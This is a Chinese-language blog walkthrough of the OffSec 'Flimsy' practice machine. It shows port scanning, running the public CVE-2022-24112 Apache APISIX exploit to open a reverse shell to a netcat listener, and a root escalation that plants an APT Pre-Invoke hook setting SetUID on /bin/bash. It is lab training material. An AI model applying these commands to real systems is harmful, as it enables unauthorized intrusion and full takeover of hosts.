---
layout: post
title:  "Offsec - Filmsy"
description: 
date:   2024-03-12 14:59:00 +0800
# last_modified_at:
categories: [CTF, Offsec]
author: d13
tags: [ctf, web exploitation, offsec]
---

終於開始練習OSCP的題目的，但真的好難喔。最簡單的題目就直接看writeup了。先抓一下解題的方向跟感覺之後再盡量自己作答。shell裡面的內容我有標記是我輸入的還是系統顯示的，方便閱讀。

## Nmap 服務探測

先用Nmap確認一下靶機上的服務：

```bash
┌─(kali?kali)-[~]
└──╼sudo nmap 192.168.58.220 -Pn -T4 -sV -sC -min-rate-1000 -p 1-65535
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-11 15:45 UTC
Nmap scan report for 192.168.58.220
Host is up (0.00063s latency).
Not shown: 65398 filtered tcp ports (no-response), 132 filtered tcp ports (host-prohibited)
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
80/tcp    open   http       nginx 1.18.0 (Ubuntu)
|_http-title: Upright
|_http-server-header: nginx/1.18.0 (Ubuntu)
3306/tcp  open   mysql      MySQL (unauthorized)
8080/tcp  closed http-proxy
43500/tcp open   http       OpenResty web app server
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
|_http-server-header: APISIX/2.8
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 136.70 seconds
```

## searchsploit 漏洞搜尋

把有版號的服務上searchsploit查一下有沒有漏洞，MySQL的有點太多了，就不列出了：

```bash
┌─(kali?kali)-[~]
└──╼$ searchsploit nginx  
---------------------------------------------------------- ---------------------------------
 Exploit Title                                            |  Path
---------------------------------------------------------- ---------------------------------
Nginx (Debian Based Distros + Gentoo) - 'logrotate' Local | linux/local/40768.sh
Nginx 0.6.36 - Directory Traversal                        | multiple/remote/12804.txt
Nginx 0.6.38 - Heap Corruption                            | linux/local/14830.py
Nginx 0.6.x - Arbitrary Code Execution NullByte Injection | multiple/webapps/24967.txt
Nginx 0.7.0 < 0.7.61 / 0.6.0 < 0.6.38 / 0.5.0 < 0.5.37 /  | linux/dos/9901.txt
Nginx 0.7.61 - WebDAV Directory Traversal                 | multiple/remote/9829.txt
Nginx 0.7.64 - Terminal Escape Sequence in Logs Command I | multiple/remote/33490.txt
Nginx 0.7.65/0.8.39 (dev) - Source Disclosure / Download  | windows/remote/13822.txt
Nginx 0.8.36 - Source Disclosure / Denial of Service      | windows/remote/13818.txt
Nginx 1.1.17 - URI Processing SecURIty Bypass             | multiple/remote/38846.txt
Nginx 1.20.0 - Denial of Service (DOS)                    | multiple/remote/50973.py
Nginx 1.3.9 < 1.4.0 - Chuncked Encoding Stack Buffer Over | linux/remote/25775.rb
Nginx 1.3.9 < 1.4.0 - Denial of Service (PoC)             | linux/dos/25499.py
Nginx 1.3.9/1.4.0 (x86) - Brute Force                     | linux_x86/remote/26737.pl
Nginx 1.4.0 (Generic Linux x64) - Remote Overflow         | linux_x86-64/remote/32277.txt
PHP-FPM + Nginx - Remote Code Execution                   | php/webapps/47553.md
---------------------------------------------------------- ---------------------------------
┌─(kali?kali)-[~]
└──╼$ searchsploit APISIX
---------------------------------------------------------- ---------------------------------
 Exploit Title                                            |  Path
---------------------------------------------------------- ---------------------------------
Apache APISIX 2.12.1 - Remote Code Execution (RCE)        | multiple/remote/50829.py
---------------------------------------------------------- ---------------------------------
```

就先用個Apache APISIX 2.12.1的RCE漏洞試試看：

```bash
┌─(kali?kali)-[~]
└──╼$ searsearchsploit -m multiple/remote/50829.py
  Exploit: Apache APISIX 2.12.1 - Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50829
     Path: /usr/share/exploitdb/exploits/multiple/remote/50829.py
    Codes: CVE-2022-24112
 Verified: False
File Type: Python script, Unicode text, UTF-8 text executable
Copied to: /home/kali/50829.py

                                                                                            
┌─(kali?kali)-[~]
└──╼$ python 50829.py http://192.168.58.220:43500/ 192.168.49.58 4444

                                   .     ,                                                  
        _.._ * __*\./ ___  _ \./._ | _ *-+-                                                 
       (_][_)|_) |/'\     (/,/'\[_)|(_)| |                                                  
          |                     |                                                           
                                                                                            
                (CVE-2022-24112)                                                            
{ Coded By: Ven3xy  | Github: https://github.com/M4xSec/ }
```

另一邊的接收端：

```bash
┌─(kali?kali)-[~]
└──╼$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.49.58] from (UNKNOWN) [192.168.58.220] 49286
└──╼$ls
ls: cannot open directory '.': Permission denied
└──╼$pwd
/root
└──╼$whoami
franklin
└──╼$pwd
/root
└──╼$ls
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
swap.img
sys
tmp
usr
var
└──╼$cd usr
└──╼$ls
bin
games
include
lib
lib32
lib64
libexec
libx32
local
sbin
share
src
└──╼$cd ..
└──╼$ls
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
swap.img
sys
tmp
usr
var
└──╼$cd home
└──╼$ls
franklin
└──╼$cd fr*  
└──╼$ls
etcd-v3.4.13-linux-amd64
etcd-v3.4.13-linux-amd64.tar.gz
local.txt
└──╼$cat local.txt
1090046dbd5f65e1002604b043a82d26
```

## Crontab 排程管理尋找提權

這邊就可以先拿到第一組flag了，接下來卡了一段時間。後來去看別人的writeup才知道要去工作排程找到以root身分執行的檔案，那這邊有兩隻

```bash
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root apt-get update
* * * * * root /root/run.sh
```

因為第二支run.sh無法編輯，所以朝apt去下手，這邊補一下apt的知識：

> 💡`apt-get update` 命令會檢查哪些路徑以更新軟體列表，您可以查看 APT 的配置文件和目錄。APT 在執行 `apt-get update` 時會檢查以下路徑：
> 
> 1. 軟體源列表文件：
>     - `/etc/apt/sources.list`：這是 APT 主要使用的軟體源列表文件。它包含了系統配置的軟體源。
>     - `/etc/apt/sources.list.d/`：該目錄下的文件是附加的軟體源列表文件，這些文件將與 `sources.list` 中的源合併。每個文件代表一個軟體源。
> 2. APT 配置文件目錄：
>     - `/etc/apt/apt.conf.d/`：該目錄包含了一系列的 APT 配置文件，這些文件允許您對 APT 的行為進行定制。這些配置文件中的指令會影響到 `apt-get update` 命令的行為。
> 
> `/etc/apt/apt.conf.d` 是一個目錄，通常用於存放針對 APT (Advanced Package Tool) 的配置文件。在這個目錄中，你可以放置以數字開頭的文件，這些數字表示配置文件的優先級，數字越小，優先級越高。例如，`00rooted` 這樣的文件名意味著它會在其他以數字開頭的文件之前被處理。
> 

將bash加上SetUID權限，SetUID權限會使得該文件以所有者的身分執行而非現在的呼叫者，所以可以使一般使用者以管理員的身分執行bash：

```bash
cd /etc/apt/apt.conf.d
echo 'APT::Update::Pre-Invoke {"chmod +s /bin/bash"};' > 00rooted
```

最後在呼叫bash起來就可以拿到系統管理員的flag了：

```bash
└──╼ ls -la /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
└──╼ bash -p
└──╼ cd /root
└──╼ ls
build.sh
default.etcd
flimsy
nohup.out
proof.txt
run.sh
snap
└──╼ cat pr*
63381851ba7ed2329af65fd5b6080cec
```